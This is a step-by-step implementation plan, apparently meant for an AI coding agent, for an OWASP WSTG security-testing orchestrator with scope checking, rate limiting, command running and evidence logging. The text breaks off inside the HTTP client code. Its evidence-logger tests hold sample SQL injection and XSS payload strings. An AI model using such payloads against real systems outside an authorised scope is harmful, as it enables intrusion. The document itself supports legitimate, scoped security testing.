# WSTG Orchestrator Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Build a modular, autonomous OWASP WSTG-aligned security testing orchestration framework with centralized state, scope enforcement, and evidence capture.

**Architecture:** Central orchestrator dispatches testing modules sequentially/in-parallel based on dependency graph. All modules share state via StateManager, scope enforcement via ScopeChecker, and rate-limited HTTP via shared utilities.

**Tech Stack:** Python 3.11+, asyncio, aiohttp, PyYAML, requests, threading, subprocess

**Design Doc:** `docs/plans/2026-02-12-wstg-orchestrator-design.md`

---

## Task 1: Project Scaffold & Dependencies

**Files:**
- Create: `wstg_orchestrator/__init__.py`
- Create: `wstg_orchestrator/modules/__init__.py`
- Create: `wstg_orchestrator/utils/__init__.py`
- Create: `requirements.txt`
- Create: `tests/__init__.py`
- Create: `tests/test_state_manager.py` (empty for now)

**Step 1: Create directory structure**

```bash
mkdir -p wstg_orchestrator/modules wstg_orchestrator/utils tests
```

**Step 2: Create package init files**

Create empty `__init__.py` in `wstg_orchestrator/`, `wstg_orchestrator/modules/`, `wstg_orchestrator/utils/`, and `tests/`.

**Step 3: Create requirements.txt**

```
pyyaml>=6.0
requests>=2.31
aiohttp>=3.9
```

**Step 4: Install dependencies**

```bash
pip install -r requirements.txt
```

**Step 5: Commit**

```bash
git add -A && git commit -m "scaffold: project structure and dependencies"
```

---

## Task 2: State Manager

**Files:**
- Create: `wstg_orchestrator/state_manager.py`
- Create: `tests/test_state_manager.py`

**Step 1: Write failing tests**

```python
# tests/test_state_manager.py
import json
import os
import tempfile
import pytest
from wstg_orchestrator.state_manager import StateManager


@pytest.fixture
def tmp_state_file():
    fd, path = tempfile.mkstemp(suffix=".json")
    os.close(fd)
    yield path
    if os.path.exists(path):
        os.remove(path)


def test_init_creates_fresh_state(tmp_state_file):
    sm = StateManager(tmp_state_file, target_domain="example.com", company_name="ExCorp")
    assert sm.get("target_domain") == "example.com"
    assert sm.get("company_name") == "ExCorp"
    assert sm.get("discovered_subdomains") == []
    assert sm.get("scan_id") is not None


def test_enrich_appends_deduplicated(tmp_state_file):
    sm = StateManager(tmp_state_file, target_domain="example.com", company_name="ExCorp")
    sm.enrich("discovered_subdomains", ["a.example.com", "b.example.com"])
    sm.enrich("discovered_subdomains", ["b.example.com", "c.example.com"])
    assert sm.get("discovered_subdomains") == ["a.example.com", "b.example.com", "c.example.com"]


def test_save_and_load(tmp_state_file):
    sm = StateManager(tmp_state_file, target_domain="example.com", company_name="ExCorp")
    sm.enrich("live_hosts", ["h1.example.com"])
    sm.save()
    sm2 = StateManager(tmp_state_file)
    assert sm2.get("live_hosts") == ["h1.example.com"]
    assert sm2.get("target_domain") == "example.com"


def test_mark_subcategory_and_phase_complete(tmp_state_file):
    sm = StateManager(tmp_state_file, target_domain="example.com", company_name="ExCorp")
    sm.mark_subcategory_complete("reconnaissance", "passive_osint")
    phases = sm.get("completed_phases")
    assert phases["reconnaissance"]["subcategories"]["passive_osint"] is True
    assert phases["reconnaissance"]["completed"] is False
    sm.mark_phase_complete("reconnaissance")
    phases = sm.get("completed_phases")
    assert phases["reconnaissance"]["completed"] is True


def test_is_phase_complete(tmp_state_file):
    sm = StateManager(tmp_state_file, target_domain="example.com", company_name="ExCorp")
    assert sm.is_phase_complete("reconnaissance") is False
    sm.mark_phase_complete("reconnaissance")
    assert sm.is_phase_complete("reconnaissance") is True


def test_is_subcategory_complete(tmp_state_file):
    sm = StateManager(tmp_state_file, target_domain="example.com", company_name="ExCorp")
    assert sm.is_subcategory_complete("reconnaissance", "passive_osint") is False
    sm.mark_subcategory_complete("reconnaissance", "passive_osint")
    assert sm.is_subcategory_complete("reconnaissance", "passive_osint") is True


def test_resume_skips_completed(tmp_state_file):
    sm = StateManager(tmp_state_file, target_domain="example.com", company_name="ExCorp")
    sm.mark_phase_complete("reconnaissance")
    sm.mark_subcategory_complete("fingerprinting", "service_scanning")
    sm.save()
    sm2 = StateManager(tmp_state_file)
    assert sm2.is_phase_complete("reconnaissance") is True
    assert sm2.is_subcategory_complete("fingerprinting", "service_scanning") is True
    assert sm2.is_phase_complete("fingerprinting") is False
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_state_manager.py -v
```

Expected: FAIL — `ModuleNotFoundError`

**Step 3: Implement StateManager**

```python
# wstg_orchestrator/state_manager.py
import json
import os
import threading
import uuid
from datetime import datetime, timezone


class StateManager:
    STATE_KEYS = [
        "target_domain", "company_name", "scan_id", "scan_start",
        "completed_phases", "discovered_subdomains", "live_hosts",
        "open_ports", "technologies", "server_versions", "frameworks",
        "endpoints", "parameters", "forms", "auth_endpoints",
        "api_endpoints", "cloud_assets", "potential_idor_candidates",
        "valid_usernames", "inferred_cves", "exposed_admin_paths",
        "pending_callbacks", "potential_vulnerabilities",
        "confirmed_vulnerabilities", "evidence_index",
    ]

    LIST_KEYS = [
        "discovered_subdomains", "live_hosts", "open_ports",
        "technologies", "server_versions", "frameworks", "endpoints",
        "parameters", "forms", "auth_endpoints", "api_endpoints",
        "cloud_assets", "potential_idor_candidates", "valid_usernames",
        "inferred_cves", "exposed_admin_paths", "pending_callbacks",
        "potential_vulnerabilities", "confirmed_vulnerabilities",
        "evidence_index",
    ]

    def __init__(self, state_file: str, target_domain: str = "", company_name: str = ""):
        self._file = state_file
        self._lock = threading.Lock()
        if os.path.exists(state_file) and os.path.getsize(state_file) > 0:
            with open(state_file, "r") as f:
                self._state = json.load(f)
        else:
            self._state = self._fresh_state(target_domain, company_name)

    def _fresh_state(self, target_domain: str, company_name: str) -> dict:
        state = {
            "target_domain": target_domain,
            "company_name": company_name,
            "scan_id": str(uuid.uuid4()),
            "scan_start": datetime.now(timezone.utc).isoformat(),
            "completed_phases": {},
        }
        for key in self.LIST_KEYS:
            state[key] = []
        return state

    def get(self, key: str):
        with self._lock:
            return self._state.get(key)

    def set(self, key: str, value):
        with self._lock:
            self._state[key] = value

    def enrich(self, key: str, values: list):
        with self._lock:
            existing = self._state.get(key, [])
            for v in values:
                if v not in existing:
                    existing.append(v)
            self._state[key] = existing

    def save(self):
        with self._lock:
            with open(self._file, "w") as f:
                json.dump(self._state, f, indent=2, default=str)

    def mark_subcategory_complete(self, phase: str, subcategory: str):
        with self._lock:
            phases = self._state.setdefault("completed_phases", {})
            phase_data = phases.setdefault(phase, {"completed": False, "subcategories": {}})
            phase_data["subcategories"][subcategory] = True
        self.save()

    def mark_phase_complete(self, phase: str):
        with self._lock:
            phases = self._state.setdefault("completed_phases", {})
            phase_data = phases.setdefault(phase, {"completed": False, "subcategories": {}})
            phase_data["completed"] = True
        self.save()

    def is_phase_complete(self, phase: str) -> bool:
        with self._lock:
            phases = self._state.get("completed_phases", {})
            return phases.get(phase, {}).get("completed", False)

    def is_subcategory_complete(self, phase: str, subcategory: str) -> bool:
        with self._lock:
            phases = self._state.get("completed_phases", {})
            return phases.get(phase, {}).get("subcategories", {}).get(subcategory, False)
```

**Step 4: Run tests to verify they pass**

```bash
pytest tests/test_state_manager.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/state_manager.py tests/test_state_manager.py
git commit -m "feat: implement StateManager with thread-safe state persistence and resume"
```

---

## Task 3: Config Loader & Scope Checker

**Files:**
- Create: `wstg_orchestrator/utils/scope_checker.py`
- Create: `wstg_orchestrator/utils/config_loader.py`
- Create: `tests/test_scope_checker.py`
- Create: `tests/test_config_loader.py`

**Step 1: Write failing tests for ScopeChecker**

```python
# tests/test_scope_checker.py
import pytest
from wstg_orchestrator.utils.scope_checker import ScopeChecker


@pytest.fixture
def checker():
    return ScopeChecker(
        base_domain="example.com",
        out_of_scope_urls=["admin.example.com", "*.internal.example.com"],
        out_of_scope_ips=["10.0.0.1"],
        out_of_scope_attack_vectors=["dos", "social_engineering"],
    )


def test_in_scope_subdomain(checker):
    assert checker.is_in_scope("https://app.example.com/api") is True


def test_out_of_scope_blacklisted_url(checker):
    assert checker.is_in_scope("https://admin.example.com") is False


def test_out_of_scope_wildcard(checker):
    assert checker.is_in_scope("https://secret.internal.example.com") is False


def test_out_of_scope_no_base_domain(checker):
    assert checker.is_in_scope("https://evil.com") is False


def test_out_of_scope_ip(checker):
    assert checker.is_in_scope("http://10.0.0.1:8080/test") is False


def test_in_scope_related_company(checker):
    assert checker.is_in_scope("https://partner.example.com/login") is True


def test_attack_vector_allowed(checker):
    assert checker.is_attack_vector_allowed("sqli") is True


def test_attack_vector_blocked(checker):
    assert checker.is_attack_vector_allowed("dos") is False
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_scope_checker.py -v
```

**Step 3: Implement ScopeChecker**

```python
# wstg_orchestrator/utils/scope_checker.py
import fnmatch
import re
from urllib.parse import urlparse


class OutOfScopeError(Exception):
    pass


class ScopeChecker:
    def __init__(
        self,
        base_domain: str,
        out_of_scope_urls: list[str] | None = None,
        out_of_scope_ips: list[str] | None = None,
        out_of_scope_attack_vectors: list[str] | None = None,
    ):
        self.base_domain = base_domain.lower()
        self.out_of_scope_urls = [u.lower() for u in (out_of_scope_urls or [])]
        self.out_of_scope_ips = set(out_of_scope_ips or [])
        self.out_of_scope_attack_vectors = set(
            v.lower() for v in (out_of_scope_attack_vectors or [])
        )

    def is_in_scope(self, target: str) -> bool:
        target_lower = target.lower()
        parsed = urlparse(target_lower if "://" in target_lower else f"http://{target_lower}")
        hostname = parsed.hostname or target_lower

        # Check if IP is blacklisted
        if hostname in self.out_of_scope_ips:
            return False

        # Must contain base domain
        if self.base_domain not in target_lower:
            return False

        # Check blacklist (exact and wildcard)
        for oos in self.out_of_scope_urls:
            if fnmatch.fnmatch(hostname, oos):
                return False
            if hostname == oos:
                return False

        return True

    def is_attack_vector_allowed(self, vector: str) -> bool:
        return vector.lower() not in self.out_of_scope_attack_vectors
```

**Step 4: Run scope checker tests**

```bash
pytest tests/test_scope_checker.py -v
```

Expected: All PASS

**Step 5: Write failing tests for ConfigLoader**

```python
# tests/test_config_loader.py
import os
import tempfile
import pytest
import yaml
from wstg_orchestrator.utils.config_loader import ConfigLoader


@pytest.fixture
def sample_config():
    return {
        "program_scope": {
            "company_name": "TestCorp",
            "base_domain": "testcorp.com",
            "wildcard_urls": ["*.testcorp.com"],
            "in_scope_urls": ["app.testcorp.com", "api.testcorp.com"],
            "in_scope_ips": [],
            "out_of_scope_urls": ["admin.testcorp.com"],
            "out_of_scope_ips": ["10.0.0.1"],
            "out_of_scope_attack_vectors": ["dos"],
            "rate_limit": 10,
            "custom_headers": {"X-Bug-Bounty": "testcorp-program"},
            "notes": "No destructive testing",
        },
        "auth_profiles": {
            "default": {
                "type": "bearer",
                "token": "abc123",
            }
        },
        "tool_configs": {
            "nmap": {"flags": "-T3"},
            "gobuster": {"threads": 20},
        },
        "callback_server": {
            "host": "0.0.0.0",
            "port": 8443,
        },
    }


@pytest.fixture
def config_file(sample_config):
    fd, path = tempfile.mkstemp(suffix=".yaml")
    os.close(fd)
    with open(path, "w") as f:
        yaml.dump(sample_config, f)
    yield path
    os.remove(path)


def test_load_config(config_file):
    config = ConfigLoader(config_file)
    assert config.company_name == "TestCorp"
    assert config.base_domain == "testcorp.com"
    assert config.rate_limit == 10


def test_custom_headers(config_file):
    config = ConfigLoader(config_file)
    assert config.custom_headers == {"X-Bug-Bounty": "testcorp-program"}


def test_get_tool_config(config_file):
    config = ConfigLoader(config_file)
    nmap_cfg = config.get_tool_config("nmap")
    assert nmap_cfg["flags"] == "-T3"
    assert config.get_tool_config("unknown_tool") == {}


def test_auth_profile(config_file):
    config = ConfigLoader(config_file)
    profile = config.get_auth_profile("default")
    assert profile["type"] == "bearer"
    assert profile["token"] == "abc123"
    assert config.get_auth_profile("nonexistent") is None


def test_scope_checker_creation(config_file):
    config = ConfigLoader(config_file)
    checker = config.create_scope_checker()
    assert checker.is_in_scope("https://app.testcorp.com") is True
    assert checker.is_in_scope("https://admin.testcorp.com") is False


def test_callback_config(config_file):
    config = ConfigLoader(config_file)
    assert config.callback_host == "0.0.0.0"
    assert config.callback_port == 8443


def test_out_of_scope_attack_vectors(config_file):
    config = ConfigLoader(config_file)
    checker = config.create_scope_checker()
    assert checker.is_attack_vector_allowed("dos") is False
    assert checker.is_attack_vector_allowed("sqli") is True
```

**Step 6: Implement ConfigLoader**

```python
# wstg_orchestrator/utils/config_loader.py
import yaml
from wstg_orchestrator.utils.scope_checker import ScopeChecker


class ConfigLoader:
    def __init__(self, config_path: str):
        with open(config_path, "r") as f:
            self._raw = yaml.safe_load(f)
        self._scope = self._raw.get("program_scope", {})
        self._auth = self._raw.get("auth_profiles", {})
        self._tools = self._raw.get("tool_configs", {})
        self._callback = self._raw.get("callback_server", {})

    @property
    def company_name(self) -> str:
        return self._scope.get("company_name", "")

    @property
    def base_domain(self) -> str:
        return self._scope.get("base_domain", "")

    @property
    def rate_limit(self) -> int:
        return self._scope.get("rate_limit", 10)

    @property
    def custom_headers(self) -> dict:
        return self._scope.get("custom_headers", {})

    @property
    def wildcard_urls(self) -> list:
        return self._scope.get("wildcard_urls", [])

    @property
    def in_scope_urls(self) -> list:
        return self._scope.get("in_scope_urls", [])

    @property
    def in_scope_ips(self) -> list:
        return self._scope.get("in_scope_ips", [])

    @property
    def out_of_scope_urls(self) -> list:
        return self._scope.get("out_of_scope_urls", [])

    @property
    def out_of_scope_ips(self) -> list:
        return self._scope.get("out_of_scope_ips", [])

    @property
    def out_of_scope_attack_vectors(self) -> list:
        return self._scope.get("out_of_scope_attack_vectors", [])

    @property
    def notes(self) -> str:
        return self._scope.get("notes", "")

    @property
    def callback_host(self) -> str:
        return self._callback.get("host", "0.0.0.0")

    @property
    def callback_port(self) -> int:
        return self._callback.get("port", 8443)

    def get_tool_config(self, tool_name: str) -> dict:
        return self._tools.get(tool_name, {})

    def get_auth_profile(self, profile_name: str) -> dict | None:
        return self._auth.get(profile_name)

    def create_scope_checker(self) -> ScopeChecker:
        return ScopeChecker(
            base_domain=self.base_domain,
            out_of_scope_urls=self.out_of_scope_urls,
            out_of_scope_ips=self.out_of_scope_ips,
            out_of_scope_attack_vectors=self.out_of_scope_attack_vectors,
        )

    def save(self, path: str):
        with open(path, "w") as f:
            yaml.dump(self._raw, f, default_flow_style=False, sort_keys=False)
```

**Step 7: Run all tests**

```bash
pytest tests/test_scope_checker.py tests/test_config_loader.py -v
```

Expected: All PASS

**Step 8: Commit**

```bash
git add wstg_orchestrator/utils/scope_checker.py wstg_orchestrator/utils/config_loader.py tests/test_scope_checker.py tests/test_config_loader.py
git commit -m "feat: implement ScopeChecker and ConfigLoader with scope enforcement"
```

---

## Task 4: Rate Limiter

**Files:**
- Create: `wstg_orchestrator/utils/rate_limit_handler.py`
- Create: `tests/test_rate_limiter.py`

**Step 1: Write failing tests**

```python
# tests/test_rate_limiter.py
import time
import pytest
from wstg_orchestrator.utils.rate_limit_handler import RateLimiter


def test_rate_limiter_allows_within_limit():
    rl = RateLimiter(requests_per_second=100, base_domain="example.com")
    start = time.monotonic()
    for _ in range(5):
        rl.acquire("https://app.example.com/test")
    elapsed = time.monotonic() - start
    assert elapsed < 1.0


def test_rate_limiter_skips_passive(monkeypatch):
    rl = RateLimiter(requests_per_second=1, base_domain="example.com")
    start = time.monotonic()
    for _ in range(50):
        rl.acquire("https://web.archive.org/something")
    elapsed = time.monotonic() - start
    assert elapsed < 0.5


def test_rate_limiter_skips_non_target():
    rl = RateLimiter(requests_per_second=1, base_domain="example.com")
    start = time.monotonic()
    for _ in range(50):
        rl.acquire("https://cve.circl.lu/api/search")
    elapsed = time.monotonic() - start
    assert elapsed < 0.5


def test_backoff_on_429():
    rl = RateLimiter(requests_per_second=100, base_domain="example.com")
    original = rl._current_rps
    rl.report_block("https://app.example.com")
    assert rl._current_rps < original


def test_recovery_after_backoff():
    rl = RateLimiter(requests_per_second=100, base_domain="example.com")
    rl.report_block("https://app.example.com")
    backed_off = rl._current_rps
    rl.report_success("https://app.example.com")
    assert rl._current_rps >= backed_off
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_rate_limiter.py -v
```

**Step 3: Implement RateLimiter**

```python
# wstg_orchestrator/utils/rate_limit_handler.py
import threading
import time
import logging

logger = logging.getLogger(__name__)

PASSIVE_DOMAINS = [
    "web.archive.org", "crt.sh", "dns", "whois",
    "google.com", "bing.com", "github.com",
    "cve.circl.lu", "services.nvd.nist.gov",
]


class RateLimiter:
    def __init__(self, requests_per_second: int, base_domain: str):
        self._max_rps = requests_per_second
        self._current_rps = float(requests_per_second)
        self._base_domain = base_domain.lower()
        self._lock = threading.Lock()
        self._last_request = 0.0
        self._min_interval = 1.0 / self._current_rps if self._current_rps > 0 else 0

    def _is_target_url(self, url: str) -> bool:
        url_lower = url.lower()
        if self._base_domain in url_lower:
            return True
        return False

    def _is_passive(self, url: str) -> bool:
        url_lower = url.lower()
        for domain in PASSIVE_DOMAINS:
            if domain in url_lower:
                return True
        return False

    def acquire(self, url: str):
        if self._is_passive(url) or not self._is_target_url(url):
            return

        with self._lock:
            now = time.monotonic()
            elapsed = now - self._last_request
            wait = self._min_interval - elapsed
            if wait > 0:
                time.sleep(wait)
            self._last_request = time.monotonic()

    def report_block(self, url: str):
        with self._lock:
            self._current_rps = max(1.0, self._current_rps / 2)
            self._min_interval = 1.0 / self._current_rps
            logger.warning(
                f"Rate limited on {url}. Backing off to {self._current_rps:.1f} rps"
            )

    def report_success(self, url: str):
        with self._lock:
            if self._current_rps < self._max_rps:
                self._current_rps = min(self._max_rps, self._current_rps * 1.1)
                self._min_interval = 1.0 / self._current_rps
```

**Step 4: Run tests**

```bash
pytest tests/test_rate_limiter.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/utils/rate_limit_handler.py tests/test_rate_limiter.py
git commit -m "feat: implement adaptive RateLimiter with backoff and passive bypass"
```

---

## Task 5: Command Runner

**Files:**
- Create: `wstg_orchestrator/utils/command_runner.py`
- Create: `tests/test_command_runner.py`

**Step 1: Write failing tests**

```python
# tests/test_command_runner.py
import pytest
from wstg_orchestrator.utils.command_runner import CommandRunner


@pytest.fixture
def runner():
    return CommandRunner(tool_configs={})


def test_check_tool_available(runner):
    assert runner.is_tool_available("echo") is True
    assert runner.is_tool_available("nonexistent_tool_xyz_123") is False


def test_run_command_success(runner):
    result = runner.run("echo", ["hello", "world"], timeout=5)
    assert result.returncode == 0
    assert "hello world" in result.stdout


def test_run_command_timeout(runner):
    result = runner.run("sleep", ["10"], timeout=1)
    assert result.returncode != 0
    assert result.timed_out is True


def test_run_command_with_tool_config():
    runner = CommandRunner(tool_configs={"echo": {"extra_args": ["-n"]}})
    cfg = runner.get_merged_args("echo", ["hello"])
    assert "-n" in cfg


def test_run_command_not_found(runner):
    result = runner.run("nonexistent_tool_xyz_123", [], timeout=5)
    assert result.returncode != 0
    assert result.tool_missing is True
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_command_runner.py -v
```

**Step 3: Implement CommandRunner**

```python
# wstg_orchestrator/utils/command_runner.py
import logging
import shutil
import subprocess
from dataclasses import dataclass, field

logger = logging.getLogger(__name__)


@dataclass
class CommandResult:
    tool: str
    args: list[str]
    returncode: int
    stdout: str = ""
    stderr: str = ""
    timed_out: bool = False
    tool_missing: bool = False


class CommandRunner:
    def __init__(self, tool_configs: dict | None = None):
        self._tool_configs = tool_configs or {}

    def is_tool_available(self, tool_name: str) -> bool:
        return shutil.which(tool_name) is not None

    def get_merged_args(self, tool_name: str, args: list[str]) -> list[str]:
        cfg = self._tool_configs.get(tool_name, {})
        extra = cfg.get("extra_args", [])
        flags = cfg.get("flags", "")
        merged = list(args)
        if flags:
            merged = flags.split() + merged
        if extra:
            merged = extra + merged
        return merged

    def run(
        self,
        tool: str,
        args: list[str] | None = None,
        timeout: int = 120,
        cwd: str | None = None,
    ) -> CommandResult:
        args = args or []

        if not self.is_tool_available(tool):
            logger.warning(f"Tool not found: {tool}")
            return CommandResult(
                tool=tool, args=args, returncode=1,
                stderr=f"Tool not found: {tool}", tool_missing=True,
            )

        merged_args = self.get_merged_args(tool, args)
        cmd = [tool] + merged_args

        try:
            proc = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=cwd,
            )
            return CommandResult(
                tool=tool, args=merged_args,
                returncode=proc.returncode,
                stdout=proc.stdout, stderr=proc.stderr,
            )
        except subprocess.TimeoutExpired:
            logger.warning(f"Tool timed out after {timeout}s: {tool}")
            return CommandResult(
                tool=tool, args=merged_args,
                returncode=-1, timed_out=True,
                stderr=f"Timed out after {timeout}s",
            )
        except Exception as e:
            logger.error(f"Error running {tool}: {e}")
            return CommandResult(
                tool=tool, args=merged_args,
                returncode=-1, stderr=str(e),
            )
```

**Step 4: Run tests**

```bash
pytest tests/test_command_runner.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/utils/command_runner.py tests/test_command_runner.py
git commit -m "feat: implement CommandRunner with tool availability checks and config merging"
```

---

## Task 6: Evidence Logger

**Files:**
- Create: `wstg_orchestrator/utils/evidence_logger.py`
- Create: `tests/test_evidence_logger.py`

**Step 1: Write failing tests**

```python
# tests/test_evidence_logger.py
import json
import os
import tempfile
import pytest
from wstg_orchestrator.utils.evidence_logger import EvidenceLogger


PHASE_SUBDIRS = {
    "reconnaissance": ["tool_output", "parsed", "evidence", "screenshots"],
    "fingerprinting": [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ],
}


@pytest.fixture
def evidence_dir():
    with tempfile.TemporaryDirectory() as d:
        yield d


def test_create_phase_directories(evidence_dir):
    el = EvidenceLogger(evidence_dir, "TestCorp", PHASE_SUBDIRS)
    company_dir = os.path.join(evidence_dir, "TestCorp")
    assert os.path.isdir(company_dir)
    assert os.path.isdir(os.path.join(company_dir, "reconnaissance", "tool_output"))
    assert os.path.isdir(os.path.join(company_dir, "reports"))


def test_log_tool_output(evidence_dir):
    el = EvidenceLogger(evidence_dir, "TestCorp", PHASE_SUBDIRS)
    path = el.log_tool_output("reconnaissance", "subfinder", "sub1.example.com\nsub2.example.com")
    assert os.path.exists(path)
    with open(path) as f:
        assert "sub1.example.com" in f.read()


def test_log_parsed(evidence_dir):
    el = EvidenceLogger(evidence_dir, "TestCorp", PHASE_SUBDIRS)
    data = {"subdomains": ["a.example.com"]}
    path = el.log_parsed("reconnaissance", "subdomains", data)
    assert os.path.exists(path)
    with open(path) as f:
        loaded = json.load(f)
    assert loaded["subdomains"] == ["a.example.com"]


def test_log_request_response(evidence_dir):
    el = EvidenceLogger(evidence_dir, "TestCorp", PHASE_SUBDIRS)
    req_path = el.log_request("fingerprinting", {"method": "GET", "url": "https://example.com"})
    resp_path = el.log_response("fingerprinting", {"status": 200, "body": "OK"})
    assert os.path.exists(req_path)
    assert os.path.exists(resp_path)


def test_log_potential_exploit(evidence_dir):
    el = EvidenceLogger(evidence_dir, "TestCorp", PHASE_SUBDIRS)
    finding = {"type": "sqli", "url": "https://example.com/search?q=test", "payload": "' OR 1=1--"}
    path = el.log_potential_exploit("fingerprinting", finding)
    assert os.path.exists(path)


def test_log_confirmed_exploit(evidence_dir):
    el = EvidenceLogger(evidence_dir, "TestCorp", PHASE_SUBDIRS)
    finding = {"type": "xss", "url": "https://example.com/reflect", "payload": "<script>alert(1)</script>"}
    path = el.log_confirmed_exploit("fingerprinting", finding)
    assert os.path.exists(path)


def test_recon_has_no_raw_requests_dir(evidence_dir):
    el = EvidenceLogger(evidence_dir, "TestCorp", PHASE_SUBDIRS)
    company_dir = os.path.join(evidence_dir, "TestCorp")
    assert not os.path.isdir(os.path.join(company_dir, "reconnaissance", "raw_requests"))
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_evidence_logger.py -v
```

**Step 3: Implement EvidenceLogger**

```python
# wstg_orchestrator/utils/evidence_logger.py
import json
import os
from datetime import datetime, timezone


class EvidenceLogger:
    def __init__(self, base_evidence_dir: str, company_name: str, phase_subdirs: dict[str, list[str]]):
        self._base = os.path.join(base_evidence_dir, company_name)
        self._company = company_name
        self._phase_subdirs = phase_subdirs
        self._setup_directories()

    def _setup_directories(self):
        os.makedirs(self._base, exist_ok=True)
        os.makedirs(os.path.join(self._base, "reports"), exist_ok=True)
        for phase, subdirs in self._phase_subdirs.items():
            for subdir in subdirs:
                os.makedirs(os.path.join(self._base, phase, subdir), exist_ok=True)

    def _timestamp(self) -> str:
        return datetime.now(timezone.utc).strftime("%Y%m%d_%H%M%S_%f")

    def _write_text(self, phase: str, subdir: str, name: str, content: str) -> str:
        path = os.path.join(self._base, phase, subdir, f"{self._timestamp()}_{name}.txt")
        with open(path, "w") as f:
            f.write(content)
        return path

    def _write_json(self, phase: str, subdir: str, name: str, data: dict | list) -> str:
        path = os.path.join(self._base, phase, subdir, f"{self._timestamp()}_{name}.json")
        with open(path, "w") as f:
            json.dump(data, f, indent=2, default=str)
        return path

    def log_tool_output(self, phase: str, tool_name: str, output: str) -> str:
        return self._write_text(phase, "tool_output", tool_name, output)

    def log_request(self, phase: str, request_data: dict) -> str:
        return self._write_json(phase, "raw_requests", "request", request_data)

    def log_response(self, phase: str, response_data: dict) -> str:
        return self._write_json(phase, "raw_responses", "response", response_data)

    def log_parsed(self, phase: str, data_name: str, data: dict | list) -> str:
        return self._write_json(phase, "parsed", data_name, data)

    def log_potential_exploit(self, phase: str, finding: dict) -> str:
        return self._write_json(phase, "potential_exploits", "potential", finding)

    def log_confirmed_exploit(self, phase: str, finding: dict) -> str:
        return self._write_json(phase, "confirmed_exploits", "confirmed", finding)

    def log_screenshot(self, phase: str, name: str, image_data: bytes) -> str:
        path = os.path.join(self._base, phase, "screenshots", f"{self._timestamp()}_{name}.png")
        with open(path, "wb") as f:
            f.write(image_data)
        return path

    def get_reports_dir(self) -> str:
        return os.path.join(self._base, "reports")
```

**Step 4: Run tests**

```bash
pytest tests/test_evidence_logger.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/utils/evidence_logger.py tests/test_evidence_logger.py
git commit -m "feat: implement EvidenceLogger with per-phase directory structure"
```

---

## Task 7: HTTP Utils

**Files:**
- Create: `wstg_orchestrator/utils/http_utils.py`
- Create: `tests/test_http_utils.py`

**Step 1: Write failing tests**

```python
# tests/test_http_utils.py
import pytest
from unittest.mock import patch, MagicMock
from wstg_orchestrator.utils.http_utils import HttpClient
from wstg_orchestrator.utils.scope_checker import ScopeChecker, OutOfScopeError
from wstg_orchestrator.utils.rate_limit_handler import RateLimiter


@pytest.fixture
def client():
    scope = ScopeChecker(base_domain="example.com")
    limiter = RateLimiter(requests_per_second=100, base_domain="example.com")
    return HttpClient(
        scope_checker=scope,
        rate_limiter=limiter,
        custom_headers={"X-Test": "value"},
    )


def test_out_of_scope_raises(client):
    with pytest.raises(OutOfScopeError):
        client.get("https://evil.com/test")


@patch("wstg_orchestrator.utils.http_utils.requests.Session.request")
def test_custom_headers_injected(mock_req, client):
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.headers = {}
    mock_resp.text = "OK"
    mock_resp.content = b"OK"
    mock_resp.url = "https://app.example.com"
    mock_req.return_value = mock_resp
    client.get("https://app.example.com/test")
    call_kwargs = mock_req.call_args
    assert call_kwargs[1]["headers"]["X-Test"] == "value"


@patch("wstg_orchestrator.utils.http_utils.requests.Session.request")
def test_returns_structured_response(mock_req, client):
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.headers = {"Server": "nginx"}
    mock_resp.text = "OK"
    mock_resp.content = b"OK"
    mock_resp.url = "https://app.example.com/test"
    mock_resp.elapsed.total_seconds.return_value = 0.5
    mock_req.return_value = mock_resp
    result = client.get("https://app.example.com/test")
    assert result.status_code == 200
    assert result.headers["Server"] == "nginx"


@patch("wstg_orchestrator.utils.http_utils.requests.Session.request")
def test_429_triggers_backoff(mock_req, client):
    mock_resp = MagicMock()
    mock_resp.status_code = 429
    mock_resp.headers = {}
    mock_resp.text = "Too Many Requests"
    mock_resp.content = b"Too Many Requests"
    mock_resp.url = "https://app.example.com/test"
    mock_resp.elapsed.total_seconds.return_value = 0.1
    mock_req.return_value = mock_resp
    original_rps = client._rate_limiter._current_rps
    client.get("https://app.example.com/test")
    assert client._rate_limiter._current_rps < original_rps
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_http_utils.py -v
```

**Step 3: Implement HttpClient**

```python
# wstg_orchestrator/utils/http_utils.py
import logging
from dataclasses import dataclass, field
import requests as req_lib

from wstg_orchestrator.utils.scope_checker import ScopeChecker, OutOfScopeError
from wstg_orchestrator.utils.rate_limit_handler import RateLimiter

logger = logging.getLogger(__name__)


@dataclass
class HttpResponse:
    status_code: int
    headers: dict
    text: str
    content: bytes
    url: str
    elapsed: float
    request_method: str = ""
    request_url: str = ""
    request_headers: dict = field(default_factory=dict)
    request_body: str | None = None


class HttpClient:
    def __init__(
        self,
        scope_checker: ScopeChecker,
        rate_limiter: RateLimiter,
        custom_headers: dict | None = None,
        timeout: int = 30,
        proxy: str | None = None,
        retries: int = 2,
    ):
        self._scope_checker = scope_checker
        self._rate_limiter = rate_limiter
        self._custom_headers = custom_headers or {}
        self._timeout = timeout
        self._retries = retries
        self._session = req_lib.Session()
        if proxy:
            self._session.proxies = {"http": proxy, "https": proxy}
            self._session.verify = False

    def _build_headers(self, extra_headers: dict | None = None) -> dict:
        headers = dict(self._custom_headers)
        if extra_headers:
            headers.update(extra_headers)
        return headers

    def request(
        self,
        method: str,
        url: str,
        headers: dict | None = None,
        data: str | dict | None = None,
        json_data: dict | None = None,
        params: dict | None = None,
        timeout: int | None = None,
        allow_redirects: bool = True,
    ) -> HttpResponse:
